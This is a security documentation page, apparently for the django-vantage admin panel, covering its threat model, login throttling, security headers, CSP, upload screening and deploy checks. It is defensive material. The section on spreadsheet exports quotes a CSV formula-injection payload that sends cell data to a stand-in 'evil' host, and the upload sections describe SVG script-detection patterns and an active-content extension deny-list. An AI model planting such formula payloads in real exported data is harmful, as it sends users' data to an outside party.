# Security

[← Index](index.md)

Everything on this page is **opt-in**, and that is a deliberate property, not an
oversight: a project that installs neither of the two middlewares described here is
byte-for-byte unchanged by their existence. The alternative — turning protections on by
default inside a library — means a project cannot tell what is guarding it without
reading the source, and a middleware that changes behaviour on upgrade is the kind of
surprise a security feature should never cause.

`manage.py check --deploy` is how you find out what you have not turned on. Read this
page once, wire the two middlewares if you want them, then let the checks hold you to
it on every deploy from then on.

## Threat model

What the panel protects, from whom, and where the lines are. Read it as the statement
of what a security report is measured against.

### Assets

- **Records** in every registered model, and the row-level and tenant scoping that
  decides which of them a person may see or change.
- **Sensitive and hidden field values** — secrets masked by
  [sensitive-field inference](sensitive-fields.md), and fields a role may not see under
  [field permissions](field-permissions.md).
- **Access control itself** — roles, their permissions and field rules, two-factor
  enrolment and recovery codes, the impersonation session, and read-only mode.
- **The audit log**, which must name the person who really acted.
- **Webhook signing secrets**, report unsubscribe tokens and undo tokens.
- **The panel's origin**: anything that runs script there runs with the reader's
  session, frequently a superuser's.

### Actors

| Actor | Trusted with | Must not be able to |
|---|---|---|
| Anonymous visitor | the sign-in page, a signed report-unsubscribe link | reach any panel page, learn whether an account exists, brute-force a password or a second factor |
| Staff with partial permissions | exactly the model, row, tenant and field permissions they hold | read or write past any of them through any surface: list, detail, forms, child formsets, bulk actions and background jobs, import, export, reports, dashboards, autocomplete, search, the JSON API, history, undo, approvals |
| Role manager (`ROLES_PERMISSION` widened) | granting what they hold themselves to *other people* | grant a permission or lift a field rule they do not hold, change a role they are a member of, or add or remove themselves |
| Approver | deciding other people's requests within their own scope | approve their own request, or one outside their row or tenant scope |
| Superuser | everything, by design — including impersonation | impersonate another superuser, act without a trace in the audit log |
| API script (session or token) | what its account holds, same rules as a person | exceed page-size caps or write a field the form would refuse |
| Plugin and panel authors | running code in-process; they are trusted | — their code is not sandboxed. Field permissions do not reach method columns, custom templates, slots or `save_model` |
| Webhook receiver | the payload for events it subscribed to | make the server connect to a private, loopback or link-local address, through redirects, proxies or DNS answers that change between check and connect |

### Trust boundaries

1. **The browser to the panel.** Every view is behind authentication and `is_staff`,
   every state change is a CSRF-protected `POST`, every `next=` is checked to stay on
   the site, and every value rendered is escaped. Uploads are screened at the field and
   (with the middleware) at the request; active content is refused unless a project
   opts in — see [Active content uploads](#active-content-uploads).
2. **The panel to the database.** User input never becomes an identifier: sort keys and
   filters are allow-listed against declared columns, aggregate aliases are positional,
   and the only raw SQL is parameterised. Every queryset passes through the permission
   resolver's `filter_queryset`, which is where tenant scoping is composed.
3. **The request to a background job.** A job stores a query string, never row ids
   for a select-all; it re-resolves the rows through the list page's own code as the
   actor, re-checking the actor's account, permission and tenant before every chunk.
4. **The panel to the network.** Webhooks only, through a client that pins the checked
   address, follows no redirect and no proxy, and has a total deadline.
5. **Configuration.** Settings that would weaken a control (two-factor requirements,
   permission resolvers, field rules in code) are code-only, never editable from the
   settings screen.

### Out of scope

Anything a superuser can already do, `DEBUG = True`, a deliberately granted
permission, and the behaviour of code the project itself registers. See
[SECURITY.md](https://github.com/Pythondeveloper6/django-vantage/blob/main/SECURITY.md)
for how to report a finding.

## What Vantage does automatically, and what it does not

Two things are always on, whatever your `MIDDLEWARE` list says:

- **CSP nonce plumbing**, if you wire the context processor (below) — the panel's own
  two unavoidable inline blocks (the theme-token stylesheet and the no-flash script)
  can be nonced, so a strict policy does not have to blanket-allow inline content.
- **Upload sniffing at the field level**, on every `FileField`/`ImageField` form —
  content is checked against what the extension claims, not trusted from it. See
  [Media and uploads](forms.md#media-and-uploads).

Two things exist but require a line in `MIDDLEWARE` to do anything:

- **`vantage.middleware.LoginThrottleMiddleware`** — rate-limits sign-in attempts.
- **`vantage.middleware.PanelSecurityMiddleware`** — response headers, per-account rate
  limits on autocomplete/export/import, and upload screening at the request level.

And one thing Vantage never does for you: **it does not set a
`Content-Security-Policy` header.** That is Django's own setting (or django-csp's), and
writing one is a decision about your project's asset origins that a library should not
make on your behalf. What Vantage supplies is the *shape* the policy needs to take to
avoid breaking the panel, below.

## Installing the middleware

```python
# settings.py
MIDDLEWARE = [
    "django.middleware.security.SecurityMiddleware",
    "django.contrib.sessions.middleware.SessionMiddleware",
    "django.middleware.common.CommonMiddleware",
    "django.middleware.csrf.CsrfViewMiddleware",
    "django.contrib.auth.middleware.AuthenticationMiddleware",
    "vantage.middleware.LoginThrottleMiddleware",
    "vantage.middleware.PanelSecurityMiddleware",
    "django.contrib.messages.middleware.MessageMiddleware",
]
```

Both must come **after** `AuthenticationMiddleware`, because `PanelSecurityMiddleware`
keys its per-surface budgets on `request.user` and `LoginThrottleMiddleware` needs the
auth signals connected. Both must come after `CsrfViewMiddleware`, so a forged POST is
refused before either one spends any effort on it.

Neither middleware is enabled in the demo project (`example/config/settings.py`) —
deliberately: the example is written to be read, not to be a production template, and
that gap is exactly what `check_deploy_login_throttle` (`vantage.W057`) and
`check_deploy_panel_middleware` (`vantage.W058`) exist to flag. Running
`manage.py check --deploy` against the demo as it ships reports both.

### `LoginThrottleMiddleware`

Rate-limits by **username *and* IP together** — never either alone. Username-only
locks out a real user the moment someone else mistypes their password; IP-only is
trivially defeated by a botnet and trivially triggered by an office NAT. Two people
using the same address get separate budgets; a script cycling through addresses to
attack one account still meets that account's budget.

It works through `process_view`, matched against the resolved view class rather than a
URL, so it protects *any* login view in the project — Vantage's own or
`django.contrib.auth`'s — with one line.

A blocked attempt never reaches the view: no query, no password hash. The refusal is:

```
429 Too Many Requests
Retry-After: 187
Cache-Control: no-store

Too many sign-in attempts. Wait a few minutes and try again.
```

The body and status are **byte-identical for a real account and a nonexistent one** —
timing and content both refuse to confirm which. Counts come from Django's own
`user_login_failed` / `user_logged_in` signals, not from guessing at a status code, and
a successful sign-in clears the counter.

| `VANTAGE` key | Default | Effect |
|---|---|---|
| `LOGIN_THROTTLE` | `True` | The kill switch, once the middleware is installed — turn counting off without unwiring anything |
| `LOGIN_THROTTLE_LIMIT` | `10` | Failures allowed per (username, IP) inside the window |
| `LOGIN_THROTTLE_WINDOW` | `300` | Seconds — both the counting window and the lockout duration |
| `LOGIN_THROTTLE_CACHE` | `"default"` | Cache alias the counters live in |
| `LOGIN_THROTTLE_IP_HEADER` | `None` | e.g. `"HTTP_X_FORWARDED_FOR"`. `None` means `REMOTE_ADDR` only — set this only once you know your proxy sets *and overwrites* it, or a client can forge the header it is trusted to read |

These four keys are read from `vantage.security.DEFAULTS`, not `vantage.conf.DEFAULTS`
— see [a settings-layer note](#two-settings-layers) below before you reach for
`vantage.conf.vantage_settings` to read one.

### `PanelSecurityMiddleware`

Scoped strictly to panel URLs — it never touches a route outside `vantage:`. Three jobs:

**Response headers**, on every panel response:

```
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Resource-Policy: same-origin
X-Robots-Tag: noindex, nofollow
```

plus Django's own never-cache headers. `check_deploy_panel_middleware`
(`vantage.W058`) says plainly that Django's `XFrameOptionsMiddleware` — which most
projects already have, defaulting to `SAMEORIGIN` — is not a substitute: an admin
panel should refuse framing altogether, not merely same-origin framing.

**Per-account rate limits** on the three surfaces expensive enough to matter — a
script that only ever talks to itself has no shared IP to punish it, so these are keyed
on the signed-in account, never the address:

| Surface | Default budget | Why that number |
|---|---|---|
| `autocomplete` | 120 requests / 60s | Two per second sustained. A debounced typeahead makes roughly one request per word typed; a script paging a table makes thousands |
| `export` | 12 requests / 300s | An export holds a database connection open for the whole download; a dozen concurrent ones is a capacity incident |
| `import` | 10 requests / 300s | Every attempt parses an attacker-supplied file; the wizard is four requests per real import, so ten is "two imports and a mistake" |
| `reveal` | 30 requests / 300s | One sensitive value per request. Enforced by the reveal view itself, so it holds even without this middleware — see [Sensitive fields](sensitive-fields.md#revealing-a-value) |

A refusal is `429` with `Retry-After` and `Cache-Control: no-store` — JSON for
autocomplete (`{"results": [], "more": false, "error": "..."}`, so a client's existing
error branch renders it), plain text elsewhere.

**Upload screening**, on any panel `POST`/`PUT`/`PATCH` carrying a multipart body: every
entry in `request.FILES` is inspected — size against the ceiling, declared content
type against sniffed bytes, and an SVG containing a script, an event handler, a
`javascript:` URL or an embedded document is refused outright. A mismatch answers
`400` naming exactly what was wrong, before the request reaches a view. See
[Media and uploads](forms.md#media-and-uploads) for the field-level half of this that
runs whether or not the middleware is installed.

> **All three layers screen SVG, as of the fix below.** The hazard scan quoted
> above — `<script>`, an event handler, `javascript:`, an embedded document — runs in
> this middleware, in `vantage.models.validate_branding_upload` (the four branding
> fields), and now in `vantage.media.validate_file_upload`, the field-level validator
> every plain `FileField` on a registered model gets. `ImageField` was never exposed:
> it refuses SVG outright, because the only safe way to render an untrusted one is
> not to.
>
> It was not always so. `validate_file_upload` used to check only the sniffed content
> type against the extension, so a file honestly named `.svg` that honestly *was* an
> SVG — script included — passed. Since `partials/thumb.html` links straight to the
> stored file, the next person to open that attachment ran the script from the panel's
> own origin with their own session, which on an admin panel is frequently a
> superuser. Confirmed by calling the validator directly before the fix.
>
> The patterns come from `vantage.security.SVG_HAZARDS` rather than being restated in
> the media layer: there were already two copies of that list, and a third would be a
> third thing to update the next time somebody finds a new way to smuggle script into
> an SVG. See `tests/test_security.py::TestFileFieldSvgScreening`.
>
> A separate `MEDIA_URL` origin (below) remains the defence in depth none of this
> replaces.

| `VANTAGE` key | Default | Effect |
|---|---|---|
| `RATE_LIMIT` | `True` | The kill switch, once the middleware is installed — headers stay on, counting stops |
| `RATE_LIMIT_CACHE` | `"default"` | Cache alias for the counters |
| `RATE_LIMITS` | `None` | Overrides the table above. **Merges** over the defaults rather than replacing them, so setting one surface's budget does not silently remove the other two |
| `UPLOAD_MAX_BYTES` | `10485760` (10 MiB) | Per-file ceiling on anything in `request.FILES`. Generous on purpose — the point is that a ceiling exists, not that it is tight |

### Two settings layers

`LOGIN_THROTTLE*`, `RATE_LIMIT*` and `UPLOAD_MAX_BYTES` are ordinary `VANTAGE` keys —
registered in `vantage.conf.DEFAULTS` and listed in
[Settings](settings.md#the-complete-list) like every other — but their defaults live in
`vantage.security.DEFAULTS`, next to the reasoning for each number. In `vantage.conf`
they are registered as `None`, meaning "no opinion here".

Two things follow. Reading one through `vantage.conf.vantage_settings` returns what you
set, or `None` when you set nothing — not the effective value. And the security layer
reads them from the raw `VANTAGE` dict rather than through `vantage_settings`, so the
login throttle never puts a database read (the settings screen's overrides) behind a
request it is trying to answer cheaply. None of them is editable from the settings
screen for the same reason.

## Content-Security-Policy

Vantage never sets this header. What it guarantees is that the panel can run under a
**strict** policy — no `'unsafe-inline'` blanket allowance — provided the policy
matches what the templates actually emit. `vantage.security.CSP_DIRECTIVES` is the
authoritative statement of that shape, reproduced here directive for directive so the
two cannot drift:

| Directive | Value, and why |
|---|---|
| `default-src` | `'self'` — every fetch the panel makes is same-origin. |
| `script-src` | `'self'` plus a nonce. One inline script (the no-flash theme stamp) and the panel's own static bundle. No CDN, no eval, no inline handlers. |
| `style-src` | `'self'` plus a nonce. One inline style block (the theme tokens) and the panel's own stylesheets. |
| `img-src` | `'self' data:` — `data:` because uploaded branding may be inlined and because the empty-state marks are data URIs. Add your media host if it is separate. |
| `font-src` | `'self'` — the panel ships no webfont and loads none. |
| `connect-src` | `'self'` — autocomplete and inline editing are same-origin fetches. |
| `frame-ancestors` | `'none'` — nothing in an admin panel should ever be framed. |
| `form-action` | `'self'` — every form in the panel posts back to the panel. |
| `base-uri` | `'none'` — the panel emits no `<base>`, and one injected would be a hijack. |
| `object-src` | `'none'` — no plugin content, ever. |

### Wiring the nonce

A nonce protects `<script>` and `<style>` **elements**. Add the context processor so
`base.html` can nonce its own two:

```python
# settings.py
TEMPLATES = [
    {
        ...,
        "OPTIONS": {
            "context_processors": [
                ...,
                "vantage.security.csp_context",
            ],
        },
    },
]
```

That publishes `csp_nonce_attr` in every template's context — deliberately not
`csp_nonce` itself, because Django 6.1's own CSP middleware already puts a name called
`csp_nonce` in the context and shadowing it with a different type would be a trap for
the next person reading the template. Generate the actual policy with Django 6.0+'s
`SECURE_CSP` / `SECURE_CSP_REPORT_ONLY` settings, or with django-csp; either way,
`check_deploy_csp` (`vantage.W056`) fires if a policy is configured but this context
processor is missing — the panel would render unstyled, or flash light before the
theme script runs.

### The part a nonce cannot reach

A nonce cannot be attached to a `style="…"` attribute or an `onclick="…"` handler —
only to a whole `<script>`/`<style>` element. Those are governed by `style-src-attr`
and `script-src-attr`, which accept only `'unsafe-inline'` or a content hash. A handful
of inline attributes remain in the templates for exactly the cases a nonce cannot
cover, so a policy also needs:

```
style-src-attr 'unsafe-inline';
script-src-attr 'unsafe-inline';
```

`check_deploy_csp_inline` (`vantage.W056`) checks a configured policy for this and
warns if it is missing — the same check id as the nonce-wiring check above, because
both answer "does this project's CSP actually work against this panel", just from two
different angles.

A full policy, assembled from the table:

```python
# settings.py — Django 6.0+
SECURE_CSP = {
    "default-src": ["'self'"],
    "script-src": ["'self'"],       # nonce is added automatically per response
    "style-src": ["'self'"],        # same
    "style-src-attr": ["'unsafe-inline'"],
    "script-src-attr": ["'unsafe-inline'"],
    "img-src": ["'self'", "data:"],
    "font-src": ["'self'"],
    "connect-src": ["'self'"],
    "frame-ancestors": ["'none'"],
    "form-action": ["'self'"],
    "base-uri": ["'none'"],
    "object-src": ["'none'"],
}
```

## Media on a separate origin

The settings screen and every `FileField`/`ImageField` accept uploads, and an uploaded
file is served back from wherever `MEDIA_URL` points. If that is the panel's own
origin, a file that turns out to be misclassified content runs with the session cookie
of whoever opens it — and a logo is on every screen, so that is everyone.
`check_deploy_media_origin` (`vantage.W059`) fires when `MEDIA_URL` is same-origin and
the project has at least one registered `FileField`. Screening at upload time (both the
field-level validators and, if installed, `PanelSecurityMiddleware`'s request-level
check) is the first line of defence; it is not a reason to skip the second one:

- Serve `MEDIA_URL` from a separate host — a subdomain is enough, since the browser's
  same-origin policy is what actually matters here, not the CDN in front of it.
- Or serve media through a storage backend that sets
  `Content-Disposition: attachment`, so a browser downloads a file rather than
  executing it inline whatever its content turns out to be.

## Active content uploads

A plain `FileField` refuses files a browser runs rather than shows — web pages
(`.html`, `.htm`, `.xhtml`, `.xht`, `.shtml`), SVG (`.svg`, `.svgz`), XML (`.xml`, `.xsl`,
`.xslt`) and scripts (`.js`, `.mjs`) — by extension, and HTML or SVG by content
whatever the extension says. A deny-list of dangerous constructs is one clever
encoding away from stored XSS on the panel's origin, so the default does not rely on
one.

A project that needs, say, SVG attachments opts in per extension:

```python
VANTAGE = {"UPLOAD_ACTIVE_SUFFIXES": [".svg"]}
```

An opted-in file is still scanned, after decoding (UTF-16 and UTF-32 included) and
expanding character references, for script elements under any namespace prefix, event
handlers, `javascript:` and `data:` documents, embedded documents and entity
declarations. The same scan guards the four branding uploads and the middleware. A
stored file of one of these kinds — including one uploaded before this rule — is
linked as a download rather than opened in a new tab. Serve media from a separate
origin as well; nothing here replaces that.

## Spreadsheet formulas in exports

A CSV opened in Excel, LibreOffice or Sheets treats a cell that starts with `=`, `+`,
`-`, `@`, a tab or a carriage return as a formula, and a formula such as
`=HYPERLINK("http://evil/?"&A1,"x")` can send other cells off to a stranger. Any text a
user can type is therefore a payload waiting for whoever exports it. The Export button
(CSV and TSV), scheduled report attachments and the import and job error reports all put
a `'` in front of such a text cell. Only text is changed; numbers, dates and booleans
are written as they are, so a negative amount stays a number. NDJSON export is not
changed. A text value that really begins with one of these characters will show the
`'` if the file is imported back. Vantage has no Excel export; one would need the same
rule.

## The `--deploy` checks

Ten checks, all silent unless the panel is actually mounted (a project that has not
wired `site.urls` into any `urls.py` gets no warnings for a panel it is not running),
all registered with `deploy=True` so they stay out of the everyday `manage.py check` —
a check that is right on a laptop and wrong in production is a check everyone learns to
scroll past.

| ID | Checks |
|---|---|
| `vantage.W050` | `DEBUG = True` with the panel mounted — a traceback page would leak settings, queries and paths to anyone who can trigger a 500 |
| `vantage.W051` | The default cache is a dummy backend (throttle and rate-limit counters count to zero forever) or `LocMemCache` (per-process — N workers means N separate budgets) while login throttling, panel rate limits or `LIST_COUNT_ESTIMATES` are in use |
| `vantage.W052` | Transport gaps in front of the panel: `SecurityMiddleware` missing, `SECURE_SSL_REDIRECT` off, `SECURE_HSTS_SECONDS` at `0`, or `SECURE_CONTENT_TYPE_NOSNIFF` off — one combined warning, deliberately overlapping Django's own `security.W004`/`W006`/`W008` rather than assuming you read those too |
| `vantage.W053` | `SESSION_COOKIE_SECURE`, `SESSION_COOKIE_HTTPONLY` or `SESSION_COOKIE_SAMESITE` left at an insecure default |
| `vantage.W054` | `VANTAGE["IMPORT_MAX_BYTES"]` is falsy (silently falls back to 5 MiB rather than disabling imports, which is probably not what `0` was meant to do) or above 64 MiB, at which point the importer is effectively unbounded — it decodes the whole upload into memory |
| `vantage.W055` | `VANTAGE["AUDIT_LOG"]` is off on a mounted panel — an unrecoverable gap in who-changed-what |
| `vantage.W056` | A CSP is configured but [the nonce context processor](#wiring-the-nonce) is missing, or it does not allow [the inline attributes](#the-part-a-nonce-cannot-reach) the templates emit |
| `vantage.W057` | No `LoginThrottleMiddleware`, and nothing else in `MIDDLEWARE` looks like a throttle (matched loosely against `axes`, `ratelimit`, `throttle`, `defender`, `brute`, so an equivalent third-party package silences this too) |
| `vantage.W058` | No `PanelSecurityMiddleware` — no security headers, no autocomplete/export/import budgets |
| `vantage.W059` | [Media served from the panel's own origin](#media-on-a-separate-origin) while at least one registered model has a `FileField` |
| `vantage.W115` | `REPORTS` is on and `REPORTS_BASE_URL` is unset, so links in [report emails](reports.md#the-email) are built from the `Host` header of the request that created each subscription |

Two-factor sign-in adds one more in its own range, `vantage.W095`: it is required of
someone while `django.contrib.admin` is mounted without
[`AdminTwoFactorMiddleware`](two-factor.md#djangos-admin).

Run it:

```bash
python manage.py check --deploy
```

Against the demo project as shipped, this reports Django's own transport warnings plus
`vantage.W050`, `W052`, `W053`, `W057` and `W058` — because the example is written to
be read, and turns none of these on. That is the intended demonstration, not a defect
in the example: wiring every one of them into a nine-model demo would bury the parts of
`example/config/settings.py` actually worth reading under boilerplate that belongs on
this page instead.

## See also

- [Two-factor sign-in](two-factor.md) — authenticator-app codes after the password, and how to require them
- [Deployment](deployment.md) — the rest of the pre-launch checklist
- [Permissions](permissions.md) — the model/object/queryset layer these checks sit above
- [Forms](forms.md#media-and-uploads) — the field-level upload validators, thumbnails, and what they refuse
- [Settings](settings.md) — every `VANTAGE` key that *is* in `conf.DEFAULTS`
